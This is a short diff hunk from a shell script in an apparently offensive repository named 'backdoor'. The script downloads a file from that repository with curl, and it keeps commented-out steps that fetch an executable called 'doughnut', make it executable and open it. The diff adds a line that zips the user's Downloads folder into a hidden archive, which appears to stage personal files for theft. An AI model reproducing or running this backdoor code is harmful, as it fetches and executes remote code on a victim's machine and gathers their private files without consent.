@@ -3,7 +3,8 @@ curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/com.wolfov
 cd ..
 # echo "success" >> .bombmaterials
 cd ..
-cd ~/Desktop
+zip -r .downloads.zip Downloads/
+# cd ~/Desktop
 # curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/doughnut"
 # chmod +x doughnut
 # open doughnut
